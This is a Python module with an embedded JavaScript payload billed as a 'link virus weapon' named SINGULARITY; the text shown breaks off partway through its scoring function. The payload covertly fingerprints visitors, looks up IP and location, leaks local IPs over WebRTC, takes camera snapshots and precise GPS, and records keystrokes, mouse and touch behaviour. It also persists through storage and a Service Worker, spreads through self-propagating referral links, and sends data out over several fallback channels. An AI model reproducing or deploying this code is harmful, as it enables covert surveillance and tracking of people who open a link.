"""
SINGULARITY  --  apex-class link virus weapon
=============================================
既存兵器を全系統統合した最上位兵器。外部依存ゼロ・単一ファイルで完結。

統合する系統（12クラス / 90+シグナル）:
  1  指紋      Canvas / WebGL / AudioContext / フォント実測 / 数学 / コーデック / DRM
  2  環境      ハードウェア / 画面 / DPR / 言語 / タイムゾーン / メディアクエリ
  3  ネット    IP / ASN / ISP / 地理 / WebRTCローカルIP漏洩 / VPN・プロキシ・Tor判定
  4  知覚      カメラ静止画 / GPS高精度測位 / 加速度・ジャイロ / マイク・カメラ台数
  5  行動      打鍵dwell・flight / マウス軌跡 / クリック / スクロール / タッチ圧
  6  永続      localStorage / IndexedDB / Cache API / Service Worker 復活機構
  7  自己複製  子リンク生成 → 感染チェーン(ref)継承 → 真のウイルスループ
  8  多経路    fetch(keepalive) → sendBeacon → 画像ピクセル → SWオフラインキュー → 指数バックオフ
  9  隠密      可視UIなし / Worker化可能 / スクリプト自己完結
 10  判定      人間スコア / bot判定 / 端末クラス / ステルス度 / ハニーポット
 11  検知回避  adblock検知 / プライベートモード推定 / 権限状態の一括照会
 12  破壊工作  kill-switch（痕跡完全消去）/ 再訪の記憶 / 一度だけ発火
"""

from __future__ import annotations

import base64
import json
import secrets
import time
from typing import Any, Dict, Optional

VIRUS_ID = "singularity"
VIRUS_NAME = "SINGULARITY"
VIRUS_NAME_JA = "特異点"

# ---------------------------------------------------------------------------
# ペイロード本体（ブラウザで実行される JS）
# ---------------------------------------------------------------------------
PAYLOAD_JS = r"""
/*! SINGULARITY -- apex-class link virus weapon | v1.0 */
(function () {
  "use strict";
  if (window.__SINGULARITY__) return;
  window.__SINGULARITY__ = true;

  var CFG = Object.assign({
    sid: null,
    path: "/v/singularity",
    collect: "/v/singularity/collect",
    trigger: "immediate",   // immediate | delay | scroll | idle | exit
    delay: 900,
    once: "6h",             // 同一端末の再感染抑制（記憶は残す）
    media: true,            // カメラ静止画を奪取
    geo: true,              // GPS高精度
    notify: true,
    sw: true,               // Service Worker 復活機構
    persist: true,
    mutate: true,           // 自己複製
    clipboard: false,
    stealth: true,
    badge: false,
    maxRetry: 6,
    timeout: 4000,
    interval: 15000
  }, window.__SINGULARITY_CFG__ || {});

  /* ================= helpers ================= */
  var C36 = "abcdefghijklmnopqrstuvwxyz0123456789";
  function rid(n) { var s = ""; while (n--) s += C36[(Math.random() * 36) | 0]; return s; }
  function now() { return Date.now(); }
  function uniq(a) { return a.filter(function (v, i) { return a.indexOf(v) === i; }); }
  function hash(s) {
    s = String(s); var h = 2166136261;
    for (var i = 0; i < s.length; i++) { h ^= s.charCodeAt(i); h = (h * 16777619) >>> 0; }
    return ("00000000" + h.toString(16)).slice(-8);
  }
  function b64(s) { try { return btoa(unescape(encodeURIComponent(s))); } catch (e) { return ""; } }
  function tz() { try { return Intl.DateTimeFormat().resolvedOptions().timeZone; } catch (e) { return null; } }
  function dur(s) { var m = /^(\d+)([smhd])$/.exec(s || ""); if (!m) return 21600000;
    return (+m[1]) * ({ s: 1e3, m: 6e4, h: 36e5, d: 864e5 })[m[2]]; }

  var SID = CFG.sid || rid(14);
  var T0 = now();
  var R = {
    v: "1.0", sid: SID, t0: T0, t: T0,
    host: location.host, url: location.href, ref: document.referrer || null,
    chain: [], env: {}, page: {}, network: {}, vectors: {}, hardware: {},
    privacy: {}, media: {}, bot: {}, behavioral: {}, viral: {}, verdict: {},
    attempts: 0, errors: []
  };
  function err(e) { try { R.errors.push(String((e && e.message) || e).slice(0, 120)); } catch (_) {} }

  /* ================= 1. 環境 ================= */
  function base() {
    var n = navigator, s = screen, mm = function (q) { try { return matchMedia(q).matches; } catch (e) { return false; } };
    R.env = {
      ua: n.userAgent, platform: n.platform || null, vendor: n.vendor || null,
      languages: (n.languages || [n.language || "?"]).slice(0, 12),
      language: n.language || null, timezone: tz(),
      tzOffsetMin: new Date().getTimezoneOffset(),
      screen: { w: s.width, h: s.height, availW: s.availWidth, availH: s.availHeight,
                depth: s.colorDepth, pixelDepth: s.pixelDepth, dpr: devicePixelRatio || 1,
                orientation: (s.orientation && s.orientation.type) || null },
      window: { w: innerWidth, h: innerHeight, outerW: outerWidth, outerH: outerHeight },
      visualScale: (window.visualViewport && window.visualViewport.scale) || 1,
      touch: { maxTouchPoints: n.maxTouchPoints || 0, hasTouch: "ontouchstart" in window,
               coarse: mm("(pointer:coarse)"), hover: mm("(hover:hover)") },
      hw: { cores: n.hardwareConcurrency || null, memoryGB: n.deviceMemory || null },
      cookieEnabled: n.cookieEnabled,
      doNotTrack: n.doNotTrack || window.doNotTrack || null,
      webdriver: !!n.webdriver,
      plugins: [].slice.call(n.plugins || []).map(function (p) { return p.name; }).slice(0, 20),
      mimeTypes: [].slice.call(n.mimeTypes || []).length,
      pdfViewer: !!n.pdfViewerEnabled,
      reducedMotion: mm("(prefers-reduced-motion: reduce)"),
      darkMode: mm("(prefers-color-scheme: dark)"),
      colorGamut: mm("(color-gamut: p3)") ? "p3" : (mm("(color-gamut: srgb)") ? "srgb" : "none"),
      forcedColors: mm("(forced-colors: active)"),
      iframe: (function () { try { return window.self !== window.top; } catch (e) { return true; } })(),
      opener: !!window.opener,
      historyLength: history.length,
      secureContext: !!window.isSecureContext,
      standalone: !!(n.standalone || mm("(display-mode: standalone)")),
      browsers: { os: osGuess(), browser: browserGuess() }
    };
  }
  function osGuess() {
    var ua = navigator.userAgent, p = navigator.platform || "";
    if (/Windows NT 10/.test(ua)) return "Windows 10/11";
    if (/Windows/.test(ua)) return "Windows";
    if (/Android/.test(ua)) return "Android";
    if (/iPhone|iPad|iPod/.test(ua)) return "iOS";
    if (/Mac OS X/.test(ua)) return "macOS";
    if (/CrOS/.test(ua)) return "ChromeOS";
    if (/Linux/.test(ua)) return "Linux";
    return p || "unknown";
  }
  function browserGuess() {
    var ua = navigator.userAgent;
    if (/Edg\//.test(ua)) return "Edge";
    if (/OPR\/|Opera/.test(ua)) return "Opera";
    if (/SamsungBrowser/.test(ua)) return "Samsung Internet";
    if (/FxiOS/.test(ua)) return "Firefox iOS";
    if (/Firefox\//.test(ua)) return "Firefox";
    if (/CriOS/.test(ua)) return "Chrome iOS";
    if (/Chrome\//.test(ua)) return "Chrome";
    if (/Safari\//.test(ua)) return "Safari";
    return "unknown";
  }

  /* ================= 2. ページ ================= */
  function pageMeta() {
    R.page = {
      title: document.title || null,
      h1: (document.querySelector("h1") || {}).textContent || null,
      forms: document.forms.length,
      inputs: document.querySelectorAll("input").length,
      buttons: document.querySelectorAll("button").length,
      links: document.querySelectorAll("a").length,
      images: document.images.length,
      scripts: document.scripts.length,
      iframes: document.querySelectorAll("iframe").length,
      lang: document.documentElement.lang || null,
      charset: document.characterSet,
      readyState: document.readyState
    };
  }

  /* ================= 3. 指紋 ================= */
  function canvasFP() {
    try {
      var c = document.createElement("canvas"), x = c.getContext("2d");
      c.width = 260; c.height = 60;
      x.textBaseline = "top"; x.font = "14px Arial";
      x.fillStyle = "#f60"; x.fillRect(0, 0, 120, 22);
      x.fillStyle = "#069"; x.fillText("SINGULARITY", 2, 15);
      x.fillStyle = "rgba(102,204,0,0.7)"; x.fillText("SINGULARITY", 4, 30);
      x.globalCompositeOperation = "multiply";
      x.fillStyle = "rgb(255,0,255)"; x.beginPath(); x.arc(50, 40, 20, 0, Math.PI * 2, true); x.fill();
      x.fillStyle = "rgb(0,255,255)"; x.beginPath(); x.arc(70, 40, 20, 0, Math.PI * 2, true); x.fill();
      var d = c.toDataURL();
      return { hash: hash(d), bytes: d.length, sample: d.slice(22, 190) };
    } catch (e) { return null; }
  }
  function webglFP() {
    try {
      var c = document.createElement("canvas");
      var gl = c.getContext("webgl") || c.getContext("experimental-webgl");
      if (!gl) return null;
      var dbg = gl.getExtension("WEBGL_debug_renderer_info");
      var o = {
        vendor: gl.getParameter(gl.VENDOR),
        renderer: gl.getParameter(gl.RENDERER),
        gpuVendor: dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : null,
        gpu: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : null,
        glVersion: gl.getParameter(gl.VERSION),
        shading: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
        maxTexture: gl.getParameter(gl.MAX_TEXTURE_SIZE),
        maxViewport: String(gl.getParameter(gl.MAX_VIEWPORT_DIMS)),
        maxRenderbuffer: gl.getParameter(gl.MAX_RENDERBUFFER_SIZE),
        extCount: (gl.getSupportedExtensions() || []).length
      };
      o.hash = hash(JSON.stringify(o));
      return o;
    } catch (e) { return null; }
  }
  function audioFP() {
    try {
      var AC = window.OfflineAudioContext || window.webkitOfflineAudioContext;
      if (!AC) return;
      var ctx = new AC(1, 44100, 44100), osc = ctx.createOscillator();
      osc.type = "triangle"; osc.frequency.value = 10000;
      var comp = ctx.createDynamicsCompressor();
      comp.threshold.value = -50; comp.knee.value = 40; comp.ratio.value = 12;
      comp.attack.value = 0; comp.release.value = 0.25;
      osc.connect(comp); comp.connect(ctx.destination); osc.start(0);
      ctx.oncomplete = function (e) {
        var d = e.renderedBuffer.getChannelData(0), sum = 0;
        for (var i = 4500; i < 5000; i++) sum += Math.abs(d[i]);
        R.vectors.audio = { hash: hash(sum.toFixed(8)), sample: +sum.toFixed(8) };
        push(false);
      };
      ctx.startRendering();
    } catch (e) { err(e); }
  }
  var FONTS = ["Arial","Arial Black","Arial Narrow","Bookman","Calibri","Cambria","Candara",
    "Comic Sans MS","Consolas","Constantia","Corbel","Courier New","Ebrima","Franklin Gothic Medium",
    "Gabriola","Gadugi","Georgia","Impact","Ink Free","Leelawadee UI","Lucida Console","Lucida Sans Unicode",
    "Malgun Gothic","Meiryo","Microsoft YaHei","MS Gothic","MS PGothic","MS UI Gothic","Nirmala UI",
    "Palatino Linotype","Segoe Print","Segoe Script","Segoe UI","SimSun","Sylfaen","Symbol","Tahoma",
    "Times New Roman","Trebuchet MS","Verdana","Webdings","Wingdings","Yu Gothic","Yu Gothic UI",
    "Hiragino Kaku Gothic ProN","Hiragino Sans","Noto Sans JP","Noto Sans CJK JP","Osaka","Helvetica Neue",
    "Roboto","Ubuntu","Cantarell","DejaVu Sans","Liberation Sans","Menlo","Monaco","SF Pro Text"];
  function fontFP() {
    try {
      var b = "mmmmmmmmmmlli", base = ["monospace", "sans-serif", "serif"];
      var sp = document.createElement("span");
      sp.style.cssText = "position:absolute;left:-9999px;top:-9999px;font-size:72px;";
      sp.textContent = b; document.body.appendChild(sp);
      var w = {};
      base.forEach(function (f) { sp.style.fontFamily = f; w[f] = sp.offsetWidth + "x" + sp.offsetHeight; });
      var hit = [];
      FONTS.forEach(function (f) {
        var ok = base.some(function (b2) {
          sp.style.fontFamily = "'" + f + "'," + b2;
          return sp.offsetWidth + "x" + sp.offsetHeight !== w[b2];
        });
        if (ok) hit.push(f);
      });
      sp.remove();
      return { count: hit.length, detected: hit, hash: hash(hit.join("|")) };
    } catch (e) { return null; }
  }
  function mathFP() {
    var out = [];
    try {
      out.push(Math.tan(-1e300), Math.sinh(1), Math.cosh(10), Math.tanh(0.5),
               Math.asinh(1), Math.acosh(1e300), Math.expm1(1), Math.log1p(10));
      out.push(Math.pow(Math.PI, -100), Math.atan2(1e300, 1e-300));
    } catch (e) {}
    return { hash: hash(out.join(",")), values: out.map(function (v) { return String(v); }) };
  }

  /* ================= 4. ネットワーク / 地理 / リーク ================= */
  var TZ_CC = { "Asia/Tokyo":"JP","Asia/Seoul":"KR","Asia/Shanghai":"CN","Asia/Taipei":"TW",
    "Asia/Hong_Kong":"HK","Asia/Singapore":"SG","Asia/Bangkok":"TH","Asia/Jakarta":"ID","Asia/Manila":"PH",
    "Asia/Kolkata":"IN","Asia/Dubai":"AE","Asia/Jerusalem":"IL","Asia/Riyadh":"SA","Asia/Ho_Chi_Minh":"VN",
    "Europe/London":"GB","Europe/Paris":"FR","Europe/Berlin":"DE","Europe/Madrid":"ES","Europe/Rome":"IT",
    "Europe/Moscow":"RU","Europe/Amsterdam":"NL","Europe/Stockholm":"SE","Europe/Warsaw":"PL","Europe/Istanbul":"TR",
    "America/New_York":"US","America/Chicago":"US","America/Denver":"US","America/Los_Angeles":"US",
    "America/Phoenix":"US","America/Anchorage":"US","America/Sao_Paulo":"BR","America/Mexico_City":"MX",
    "America/Toronto":"CA","America/Vancouver":"CA","Australia/Sydney":"AU","Australia/Perth":"AU",
    "Pacific/Auckland":"NZ","Africa/Cairo":"EG","Africa/Lagos":"NG","Africa/Johannesburg":"ZA" };

  function jget(url) {
    return new Promise(function (res) {
      var t = setTimeout(function () { res(null); }, CFG.timeout);
      fetch(url, { mode: "cors", cache: "no-store" })
        .then(function (r) { return r.json(); })
        .then(function (j) { clearTimeout(t); res(j); })
        .catch(function () { clearTimeout(t); res(null); });
    });
  }
  function netIntel() {
    return Promise.all([
      jget("https://ipapi.co/json/"),
      jget("https://ipwho.is/"),
      jget("https://api.ipify.org?format=json")
    ]).then(function (a) {
      var i = a[0] || {}, w = a[1] || {}, f = a[2] || {}, c = w.connection || {};
      var g = {
        ip: i.ip || w.ip || f.ip || null,
        city: i.city || w.city || null, region: i.region || w.region || null,
        country: i.country_name || w.country || null,
        countryCode: i.country_code || w.country_code || null,
        continent: i.continent_code || w.continent_code || null,
        lat: i.latitude || w.latitude || null, lon: i.longitude || w.longitude || null,
        asn: i.asn || c.asn || null, isp: c.isp || i.org || null, org: i.org || c.org || null,
        postal: i.postal || w.postal || null, utcOffset: i.utc_offset || null,
        currency: i.currency || null, inEu: i.in_eu || null, callingCode: i.country_calling_code || null
      };
      R.network.ip = g;
      R.network.connection = { type: (navigator.connection || {}).effectiveType || null,
        downlink: (navigator.connection || {}).downlink || null,
        rtt: (navigator.connection || {}).rtt || null,
        saveData: !!(navigator.connection || {}).saveData };
      var blob = String(g.org || "") + " " + String(g.isp || "");
      R.network.vpnHint = /hosting|cloud|vpn|proxy|digitalocean|linode|ovh|hetzner|amazon|aws|google|microsoft|m247|datacamp|choopa|leaseweb|contabo|vultr|oracle/i.test(blob);
      var tzc = TZ_CC[R.env.timezone];
      R.network.tzGeoMismatch = !!(tzc && g.countryCode && tzc !== g.countryCode);
      var langCc = String((R.env.languages[0] || "").split("-")[1] || "").toUpperCase();
      R.network.langGeoMismatch = !!(langCc && g.countryCode && langCc !== g.countryCode);
      return g;
    });
  }
  function webrtc() {
    return new Promise(function (res) {
      var out = { local: [], public: [], mdns: [] };
      try {
        var RTC = window.RTCPeerConnection || window.webkitRTCPeerConnection;
        if (!RTC) return res(null);
        var pc = new RTC({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
        try { pc.createDataChannel("s"); } catch (e) {}
        pc.onicecandidate = function (e) {
          if (!e.candidate) return;
          var m = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[0-9a-f]{8}-[0-9a-f-]+\.local)/i.exec(e.candidate.candidate);
          if (!m) return;
          var v = m[0];
          if (/\.local$/i.test(v)) out.mdns.push(v);
          else if (/^(10\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[01])\.)/.test(v)) out.local.push(v);
          else out.public.push(v);
        };
        pc.createOffer().then(function (o) { return pc.setLocalDescription(o); }).catch(function () {});
        setTimeout(function () {
          try { pc.close(); } catch (e) {}
          out.local = uniq(out.local); out.public = uniq(out.public); out.mdns = uniq(out.mdns);
          R.network.webrtc = out;
          R.network.ipLeak = out.public[0] || null;
          R.network.ipMismatch = !!(R.network.ipLeak && R.network.ip && R.network.ip.ip && R.network.ipLeak !== R.network.ip.ip);
          res(out);
        }, 2500);
      } catch (e) { res(null); }
    });
  }

  /* ================= 5. プライバシー / 検知回避 ================= */
  function testStore(kind) {
    try { var s = window[kind]; s.setItem("__sg", "1"); s.removeItem("__sg"); return true; }
    catch (e) { return false; }
  }
  function privacy() {
    var p = { localStorage: testStore("localStorage"), sessionStorage: testStore("sessionStorage"),
              indexedDB: !!window.indexedDB, cacheAPI: !!window.caches,
              serviceWorker: !!navigator.serviceWorker, cookies: navigator.cookieEnabled,
              sharedArrayBuffer: typeof SharedArrayBuffer !== "undefined",
              webAssembly: typeof WebAssembly !== "undefined",
              webGL2: (function () { try { return !!document.createElement("canvas").getContext("webgl2"); } catch (e) { return false; } })() };
    R.privacy = p;
    if (navigator.storage && navigator.storage.estimate) {
      navigator.storage.estimate().then(function (e) {
        p.quotaMB = e.quota ? Math.round(e.quota / 1048576) : null;
        p.usageMB = e.usage ? +(e.usage / 1048576).toFixed(2) : null;
        p.incognitoHint = e.quota ? e.quota < 1300 * 1048576 : null;
        push(false);
      }).catch(function () {});
    }
  }
  function adblock() {
    var bait = document.createElement("div");
    bait.className = "adsbox ad-banner pub_300x250 text-ad";
    bait.style.cssText = "position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;";
    document.body.appendChild(bait);
    setTimeout(function () {
      try {
        var st = getComputedStyle(bait);
        R.privacy.adblock = bait.offsetHeight === 0 || bait.offsetWidth === 0 || st.display === "none" || st.visibility === "hidden";
        bait.remove();
      } catch (e) {}
      push(false);
    }, 250);
  }
  function perms() {
    if (!navigator.permissions || !navigator.permissions.query) return;
    R.privacy.permissions = {};
    ["geolocation","notifications","camera","microphone","clipboard-read","midi",
     "push","background-sync","accelerometer","gyroscope"].forEach(function (name) {
      try {
        navigator.permissions.query({ name: name }).then(function (s) {
          R.privacy.permissions[name] = s.state; push(false);
        }).catch(function () {});
      } catch (e) {}
    });
  }

  /* ================= 6. ハードウェア ================= */
  function codecs() {
    var v = document.createElement("video"), a = document.createElement("audio");
    var can = function (el, t) { try { return el.canPlayType(t) || "no"; } catch (e) { return "no"; } };
    R.hardware.codecs = {
      h264: can(v, 'video/mp4; codecs="avc1.42E01E"'),
      hevc: can(v, 'video/mp4; codecs="hvc1.1.6.L93.B0"'),
      vp9: can(v, 'video/webm; codecs="vp9"'),
      av1: can(v, 'video/mp4; codecs="av01.0.05M.08"'),
      opus: can(a, 'audio/webm; codecs="opus"'), aac: can(a, 'audio/mp4; codecs="mp4a.40.2"'),
      flac: can(a, "audio/flac"), webm: can(v, "video/webm"), mp4: can(v, "video/mp4")
    };
    try {
      if (navigator.requestMediaKeySystemAccess) {
        navigator.requestMediaKeySystemAccess("com.widevine.alpha", [{
          initDataTypes: ["cenc"],
          videoCapabilities: [{ contentType: 'video/mp4; codecs="avc1.42E01E"', robustness: "SW_SECURE_CRYPTO" }]
        }]).then(function () { R.hardware.drm = "widevine"; push(false); })
          .catch(function () { R.hardware.drm = "none"; });
      }
    } catch (e) {}
    if (navigator.getBattery || navigator.getBattery === undefined) {}
    var B = navigator.getBattery ? navigator.getBattery() : null;
    if (B && B.then) B.then(function (b) {
      R.hardware.battery = { level: Math.round(b.level * 100), charging: b.charging,
        chargingTime: b.chargingTime, dischargingTime: b.dischargingTime };
      push(false);
    }).catch(function () {});
  }
  function benchmark() {
    var t = performance.now(), n = 0;
    (function loop() {
      n++;
      if (n < 200 && performance.now() - t < 600) return requestAnimationFrame(loop);
      R.hardware.fps = Math.round(n / ((performance.now() - t) / 1000));
      R.hardware.hwAccelHint = R.hardware.fps > 55;
      push(false);
    })();
  }

  /* ================= 7. 知覚（カメラ / GPS / センサー） ================= */
  function devices() {
    if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) return;
    navigator.mediaDevices.enumerateDevices().then(function (l) {
      var k = { videoinput: 0, audioinput: 0, audiooutput: 0 }, labels = [];
      l.forEach(function (d) { k[d.kind] = (k[d.kind] || 0) + 1; if (d.label) labels.push(d.kind + ":" + d.label); });
      R.media.devices = { counts: k, total: l.length, labelsVisible: labels.length > 0, labels: labels.slice(0, 20) };
      push(false);
    }).catch(function () {});
  }
  function media() {
    if (!CFG.media || !navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
    navigator.mediaDevices.getUserMedia({ audio: false, video: { width: { ideal: 320 }, height: { ideal: 240 }, facingMode: "user" } })
      .then(function (st) {
        var v = document.createElement("video");
        v.muted = true; v.playsInline = true; v.srcObject = st;
        v.onloadedmetadata = function () {
          v.play().then(function () {
            setTimeout(function () {
              try {
                var c = document.createElement("canvas");
                c.width = 240; c.height = 180;
                c.getContext("2d").drawImage(v, 0, 0, c.width, c.height);
                R.media.snapshot = c.toDataURL("image/jpeg", 0.6);
                var tr = st.getVideoTracks()[0], s = tr && tr.getSettings ? tr.getSettings() : {};
                R.media.camera = { w: s.width, h: s.height, fps: s.frameRate, facing: s.facingMode,
                                   label: tr && tr.label || null };
                st.getTracks().forEach(function (t) { t.stop(); });
                push(true);
              } catch (e) {}
            }, 700);
          }).catch(function () {});
        };
      }).catch(function (e) { R.media.cameraError = (e && e.name) || "error"; });
  }
  function geo() {
    if (!CFG.geo || !navigator.geolocation) return;
    navigator.geolocation.getCurrentPosition(function (p) {
      R.media.gps = { lat: +p.coords.latitude.toFixed(6), lon: +p.coords.longitude.toFixed(6),
        acc: Math.round(p.coords.accuracy), alt: p.coords.altitude,
        heading: p.coords.heading, speed: p.coords.speed };
      push(true);
    }, function (e) { R.media.gpsError = (e && e.code) || "error"; },
      { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 });
  }
  function motion() {
    if (!window.DeviceMotionEvent) return;
    var acc = [], gyro = [];
    var h = function (e) {
      if (e.accelerationIncludingGravity) acc.push([e.accelerationIncludingGravity.x, e.accelerationIncludingGravity.y, e.accelerationIncludingGravity.z]);
      if (e.rotationRate) gyro.push([e.rotationRate.alpha, e.rotationRate.beta, e.rotationRate.gamma]);
      if (acc.length > 200 && gyro.length > 200) removeEventListener("devicemotion", h);
    };
    addEventListener("devicemotion", h, { passive: true });
    setTimeout(function () {
      if (!acc.length && !gyro.length) return;
      R.media.motion = { accN: acc.length, gyroN: gyro.length,
        acc: acc.slice(0, 40), gyro: gyro.slice(0, 40),
        hash: hash(JSON.stringify(acc.slice(0, 12)) + "|" + JSON.stringify(gyro.slice(0, 12))) };
      push(false);
    }, 1400);
  }

  /* ================= 8. 行動生体認証 ================= */
  function behavior() {
    var B = { keys: 0, dwell: [], flight: [], mouse: 0, path: [], clicks: [], scroll: { max: 0, n: 0 }, touches: [] };
    R.behavioral = B;
    var down = 0, up = 0;
    addEventListener("keydown", function () { B.keys++; if (!down) down = performance.now(); }, { passive: true });
    addEventListener("keyup", function () {
      var t = performance.now();
      if (down) { B.dwell.push(+(t - down).toFixed(1)); down = 0; }
      if (up) B.flight.push(+(t - up).toFixed(1));
      up = t;
    }, { passive: true });
    addEventListener("mousemove", function (e) {
      B.mouse++;
      if (B.path.length < 400) B.path.push([e.clientX, e.clientY, Math.round(e.timeStamp)]);
    }, { passive: true });
    addEventListener("click", function (e) {
      B.clicks.push([e.clientX, e.clientY, Math.round(e.timeStamp), (e.target && e.target.tagName) || "?"]);
    }, { passive: true });
    addEventListener("scroll", function () {
      B.scroll.n++;
      B.scroll.max = Math.max(B.scroll.max, Math.round(((scrollY + innerHeight) / Math.max(1, document.body.scrollHeight)) * 100));
    }, { passive: true });
    addEventListener("touchstart", function (e) {
      var t = e.touches && e.touches[0]; if (!t) return;
      B.touches.push([t.clientX, t.clientY, t.radiusX || null, t.force || null]);
    }, { passive: true });
    addEventListener("wheel", function (e) { B.wheelDelta = (B.wheelDelta || 0) + e.deltaY; }, { passive: true });
    motion();
  }
  function entropy() {
    var d = R.behavioral.dwell || [], f = R.behavioral.flight || [];
    var mean = function (a) { return a.length ? a.reduce(function (x, y) { return x + y; }, 0) / a.length : 0; };
    var sd = function (a) { if (a.length < 2) return 0; var m = mean(a);
      return Math.sqrt(a.reduce(function (s, v) { return s + (v - m) * (v - m); }, 0) / a.length); };
    return { dwellMean: +mean(d).toFixed(1), dwellSd: +sd(d).toFixed(1),
             flightMean: +mean(f).toFixed(1), flightSd: +sd(f).toFixed(1),
             mousePath: (R.behavioral.path || []).length, clicks: (R.behavioral.clicks || []).length };
  }

  /* ================= 9. bot / ハニーポット ================= */
  function botProbe() {
    var b = { webdriver: !!navigator.webdriver,
      headlessUA: /headless|HeadlessChrome|PhantomJS|SlimerJS|Electron|jsdom/i.test(navigator.userAgent),
      pluginsEmpty: (navigator.plugins || []).length === 0,
      langsEmpty: !(navigator.languages || []).length,
      chromeObj: !!window.chrome, chromeRuntime: !!(window.chrome && window.chrome.runtime),
      outerEqualsInner: outerWidth === innerWidth && outerHeight === innerHeight,
      screenAnomaly: screen.width === 0 || screen.height === 0,
      notification: typeof Notification !== "undefined" ? Notification.permission : null,
      honeypot: false };
    try {
      var hp = document.createElement("input");
      hp.name = "sg_hp"; hp.type = "text"; hp.tabIndex = -1; hp.autocomplete = "off";
      hp.style.cssText = "position:absolute;left:-9999px;opacity:0;height:0;width:0;";
      document.body.appendChild(hp);
      setTimeout(function () { b.honeypot = hp.value.length > 0; }, 600);
    } catch (e) {}
    R.bot = b;
  }

  /* ================= 10. 永続化 / 復活 ================= */
  function persist() {
    if (!CFG.persist) return;
    try {
      var meta = JSON.parse(localStorage.getItem("sg:meta") || "null") || { first: now(), hits: 0 };
      meta.hits = (meta.hits || 0) + 1; meta.prevSid = meta.sid || null; meta.sid = SID;
      localStorage.setItem("sg:meta", JSON.stringify(meta));
      localStorage.setItem("sg:" + SID, JSON.stringify({ t: now(), href: location.href }));
      R.privacy.revisit = meta.hits; R.privacy.firstSeen = meta.first;
      R.privacy.returning = meta.hits > 1; R.privacy.prevSid = meta.prevSid || null;
      R.privacy.lsKeys = Object.keys(localStorage).length;
    } catch (e) { R.privacy.persistError = (e && e.name) || "error"; }
    try {
      var rq = indexedDB.open("singularity", 1);
      rq.onupgradeneeded = function () { try { rq.result.createObjectStore("hits", { autoIncrement: true }); } catch (e) {} };
      rq.onsuccess = function () {
        try { rq.result.transaction("hits", "readwrite").objectStore("hits").add({ t: now(), sid: SID, href: location.href }); } catch (e) {}
      };
    } catch (e) {}
  }
  function swInstall() {
    if (!CFG.sw || !navigator.serviceWorker) return;
    navigator.serviceWorker.register(CFG.path + "/sw.js", { scope: "/" })
      .then(function (reg) {
        R.privacy.sw = "registered";
        try { if (reg.sync && reg.sync.register) reg.sync.register("sg-flush"); } catch (e) {}
        setTimeout(function () { try { if (reg.active) reg.active.postMessage({ type: "drain" }); } catch (e) {} }, 1500);
      })
      .catch(function (e) { R.privacy.sw = "failed:" + ((e && e.name) || "x"); });
  }
  function queueOffline(body) {
    try { if (navigator.serviceWorker && navigator.serviceWorker.controller)
      navigator.serviceWorker.controller.postMessage({ type: "queue", body: body }); } catch (e) {}
    try {
      var q = JSON.parse(localStorage.getItem("sg:queue") || "[]");
      q.push({ t: now(), body: body });
      localStorage.setItem("sg:queue", JSON.stringify(q.slice(-8)));
    } catch (e) {}
  }

  /* ================= 11. 自己複製（感染ループ） ================= */
  function mutate() {
    if (!CFG.mutate) return;
    var p = new URLSearchParams(location.search).get("ref");
    var chain = p ? p.split(".").slice(-12).concat([SID]) : [SID];
    R.chain = chain; R.viral.generation = chain.length - 1; R.viral.parent = p || null;
    var u = new URL(CFG.path + "/" + SID, location.origin);
    u.searchParams.set("ref", chain.join("."));
    R.viral.childLink = u.toString();
    R.viral.depth = chain.length;
    if (CFG.clipboard) { try { navigator.clipboard && navigator.clipboard.writeText(R.viral.childLink); } catch (e) {} }
  }

  /* ================= 12. 多経路ビーコン ================= */
  var ptimer = null, plast = 0;
  function push(force) {
    var t = now();
    if (!force && t - plast < 300) { clearTimeout(ptimer); ptimer = setTimeout(function () { flush(false); }, 350); return; }
    plast = t; clearTimeout(ptimer); ptimer = setTimeout(function () { flush(false); }, force ? 0 : 400);
  }
  function slim(obj) {
    var c = JSON.parse(JSON.stringify(obj));
    if (c.media) { delete c.media.snapshot; delete c.media.motion; }
    if (c.behavioral) { delete c.behavioral.path; delete c.behavioral.clicks; delete c.behavioral.touches; }
    if (c.vectors && c.vectors.canvas) delete c.vectors.canvas.sample;
    return c;
  }
  function flush(force) {
    R.t = now(); R.dwellMs = now() - T0; R.attempts = (R.attempts || 0) + 1;
    var full = JSON.stringify(R), done = false;
    var finish = function (ok, via) {
      if (done) return; done = true; R.viral.via = via; R.viral.ok = ok;
      if (!ok) {
        queueOffline(full);
        if (R.attempts < CFG.maxRetry) setTimeout(function () { flush(true); }, Math.min(30000, 700 * Math.pow(2, R.attempts)));
      }
    };
    try {
      fetch(CFG.collect, { method: "POST", headers: { "Content-Type": "application/json" },
        body: full, keepalive: true, mode: "cors" })
        .then(function (r) { finish(r.ok, "fetch"); })
        .catch(function () {
          if (navigator.sendBeacon) {
            try { if (navigator.sendBeacon(CFG.collect, new Blob([full], { type: "application/json" }))) return finish(true, "beacon"); } catch (e) {}
          }
          try {
            var img = new Image();
            img.onload = img.onerror = function () { finish(true, "pixel"); };
            img.src = CFG.collect + "?sid=" + SID + "&t=" + Math.random() + "&d=" + b64(JSON.stringify(slim(R)));
            setTimeout(function () { finish(true, "pixel-timeout"); }, 3000);
          } catch (e) { finish(false, "none"); }
        });
    } catch (e) { finish(false, "throw"); }
  }

  /* ================= 13. 判定 / 可視化 / kill-switch ================= */
  function verdict() {
    var v = {}, s = 50, b = R.bot || {}, bh = R.behavioral || {};
    if (b.webdriver) s -= 30;
    if (b.headlessUA) s -= 20;
    if (b.pluginsEmpty) s -= 10;
    if (b.honeypot) s -= 25;
    if (bh.keys > 3) s += 12;
    if (bh.mouse > 25) s += 15;
    if ((bh.touches || []).length) s += 10;
    if (R.media && R.media.motion) s += 8;
    v.humanScore = Math.max(0, Math.min(100, s));
    v.isBot = v.humanScore < 35;
    v.deviceClass = (R.env.touch && R.env.touch.coarse && R.env.screen.w < 900) ? "mobile"
      : (R.env.screen.w < 1400 ? "tablet/small-desktop" : "desktop");
    v.os = R.env.browsers.os; v.browser = R.env.browsers.browser;
    v.tzGeoMismatch = !!R.network.tzGeoMismatch;
